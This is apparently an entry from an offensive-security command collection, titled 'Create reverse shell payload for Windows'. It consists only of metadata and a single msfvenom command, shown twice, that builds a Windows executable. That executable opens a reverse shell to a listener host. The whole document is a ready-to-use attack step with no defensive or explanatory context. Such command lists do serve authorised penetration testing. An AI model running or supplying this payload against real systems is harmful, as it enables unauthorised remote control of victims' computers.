---
id: 1338b8b8-5a70-4ae4-b046-070d57c53f46
name: Create reverse shell payload for Windows
type: command
executor: bash
data: msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
output: null
created_at: '2023-04-06T03:56:24.842667+00:00'
updated_at: '2023-04-10T20:25:25.584128+00:00'
---

# Create reverse shell payload for Windows

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
```


